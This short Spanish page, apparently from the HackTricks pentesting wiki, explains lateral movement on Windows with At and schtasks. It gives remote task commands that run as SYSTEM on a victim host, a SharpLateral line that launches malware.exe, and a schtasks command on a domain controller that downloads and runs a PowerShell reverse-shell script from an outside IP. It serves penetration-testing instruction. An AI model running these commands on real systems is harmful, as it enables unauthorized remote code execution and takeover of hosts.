# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## ¿Cómo funciona?

At permite programar tareas en hosts donde conoces el nombre de usuario/(contraseña/Hash). Así que, puedes usarlo para ejecutar comandos en otros hosts y obtener la salida.
```
At \\victim 11:00:00PM shutdown -r
```
Usando schtasks, primero necesitas crear la tarea y luego llamarla:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
También puedes usar [SharpLateral](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Más información sobre el [**uso de schtasks con silver tickets aquí**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
